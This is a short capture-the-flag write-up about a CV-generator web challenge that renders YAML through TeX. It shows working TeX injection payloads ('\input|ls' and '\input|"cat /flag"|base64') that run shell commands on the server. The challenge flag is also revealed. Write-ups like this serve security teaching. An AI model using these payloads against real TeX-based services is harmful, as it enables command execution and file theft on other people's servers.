# linked out (web)

in the task we get access to a webpage for generating cvs.
we are supposed to upload a yaml input file, and the page generates a pdf with a nice cv theme.
we get an example input file so we can test the platform.

there is a link to the github with style configuration of the theme, so we learn that this is all done with tex.

this points into the direction of injecting some malicious tex directives inside the yaml payload in order to exploit the server.

as one of the fields we can send for example '\input|ls ' and we get:


[image extracted text: a
schneier
security expert
master of internet
221b baker street; london; england
0+123 456 789 012
bruce schneier@it-is-not-my-real-email.com
4 https-/ {wwwschneiercomf
@ schneier-not-my-real-account
schneier-not-my-real-account
@ schneier-not-my-real-account
schner
ierblog
9 schneier-not-my-real-account
schneier-not-my-real-account
schneier-not-my-real-
ccount
one of my books!
makefile fonts src
education
university of rochester
rochester; ny; usa
phd in quantum physics and astrophysics
april 1980
august 1984
fassssssyl
buy '5]


so we can list files on the server.
with this we can try to browse a bit to look for the flag.
we find the `flag` file in root `/` directory and we can send another payload `'\input|"cat /flag"|base64 '` to get:


[image extracted text: a
schneier
security expert
master of internet
221b baker street; london; england
0+123 456 789 012
bruce schneier@it-is-not-my-real-email.com
https-/ {wwwschneiercom/
schneier-not-my-real-account
schneier-not-my-real-account
@ schneier-not-my-real-account
schneierblog
0 schneier-not-my-real-account
schneier-not-my-real-account
schneier-not-my-real-account
one of my books!
tkrleofuzf9eb2shbgrfs2sidghfy3jiyxrizf9oagvfavriwhok
education
university of rochester
rochester; ny; usa
phd in quantum physics and astrophysics
april 1980
august 1984
eassssssyl
buy =]


so the flag is: `ndh{and_donald_knuth_created_the_itex}`

final payload [here](inject.yml)
